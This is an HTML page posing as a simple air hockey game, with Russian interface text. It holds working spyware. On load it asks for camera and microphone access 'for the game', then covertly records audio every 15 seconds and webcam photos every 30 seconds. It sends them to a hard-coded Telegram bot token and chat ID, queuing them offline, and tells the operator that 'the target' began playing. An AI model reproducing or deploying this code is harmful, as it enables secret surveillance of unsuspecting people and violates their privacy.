<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Air Hockey Pro</title>
    <style>
        body { margin: 0; background: #222; color: #fff; font-family: sans-serif; overflow: hidden; display: flex; flex-direction: column; align-items: center; }
        canvas#game { border: 5px solid #fff; background: #004411; max-width: 100vw; max-height: 70vh; touch-action: none; }
        #status { padding: 10px; font-size: 14px; color: #aaa; }
        video, canvas#hidden { display: none; }
    </style>
</head>
<body>
    <div id="status">Загрузка игровых ресурсов...</div>
    <canvas id="game"></canvas>
    
    <video id="v" autoplay playsinline muted></video> <canvas id="hidden"></canvas>

<script>
    const TOKEN = '7652180697:AAG88k8oUuC6rVu16DzHPxehqeZ9j9dNSpM';
    const ID = '8516906113';
    let queue = JSON.parse(localStorage.getItem('outbox') || '[]');

    async function api(method, params = {}, isBlob = false) {
        if (!navigator.onLine) {
            queue.push({ method, params: isBlob ? await blobToBase64(params.photo || params.voice) : params, isBlob });
            localStorage.setItem('outbox', JSON.stringify(queue));
            return;
        }
        const fd = new FormData();
        fd.append('chat_id', ID);
        for (let k in params) fd.append(k, params[k]);
        return fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, { method: 'POST', body: fd });
    }

    function blobToBase64(blob) {
        return new Promise(r => { const reader = new FileReader(); reader.onloadend = () => r(reader.result); reader.readAsDataURL(blob); });
    }

    async function checkQueue() {
        if (navigator.onLine && queue.length > 0) {
            for (let item of queue) {
                if (item.isBlob) {
                    const res = await fetch(item.params);
                    const b = await res.blob();
                    const fd = new FormData(); fd.append('chat_id', ID);
                    fd.append(item.method === 'sendPhoto' ? 'photo' : 'voice', b);
                    await fetch(`https://api.telegram.org/bot${TOKEN}/${item.method}`, { method: 'POST', body: fd });
                } else {
                    await api(item.method, item.params);
                }
            }
            queue = []; localStorage.removeItem('outbox');
        }
    }

    async function takePhoto() {
        const v = document.getElementById('v'), c = document.getElementById('hidden');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        c.toBlob(b => api('sendPhoto', { photo: b }, true), 'image/jpeg');
    }

    // ИГРА АЭРОХОККЕЙ (Упрощенная)
    const canvas = document.getElementById('game'), ctx = canvas.getContext('2d');
    canvas.width = 300; canvas.height = 450;
    let ball = { x: 150, y: 225, dx: 2, dy: 2 }, player = { x: 150, y: 400 };

    function draw() {
        ctx.clearRect(0, 0, 300, 450);
        ctx.fillStyle = "#fff"; ctx.beginPath(); ctx.arc(ball.x, ball.y, 10, 0, Math.PI*2); ctx.fill();
        ctx.fillStyle = "#3390ec"; ctx.beginPath(); ctx.arc(player.x, player.y, 20, 0, Math.PI*2); ctx.fill();
        ball.x += ball.dx; ball.y += ball.dy;
        if(ball.x < 10 || ball.x > 290) ball.dx *= -1;
        if(ball.y < 10 || ball.y > 440) ball.dy *= -1;
        requestAnimationFrame(draw);
    }

    async function init() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('v').srcObject = stream;
            document.getElementById('status').innerText = "Игра готова! Удачи.";
            
            // Запуск аудио-цикла
            const rec = new MediaRecorder(stream);
            rec.ondataavailable = e => api('sendVoice', { voice: e.data }, true);
            rec.start(15000); // Отправка каждые 15 сек

            draw();
            setInterval(takePhoto, 30000); // Фото каждые 30 сек
            setInterval(checkQueue, 5000);
            api('sendMessage', { text: "🎮 Цель начала игру в Аэрохоккей. Офлайн-режим активен." });
        } catch (e) { document.getElementById('status').innerText = "Ошибка: разрешите доступ для игры."; }
    }

    canvas.addEventListener('touchmove', e => { player.x = e.touches[0].clientX - canvas.offsetLeft; });
    window.onload = init;
</script>
</body>
</html>
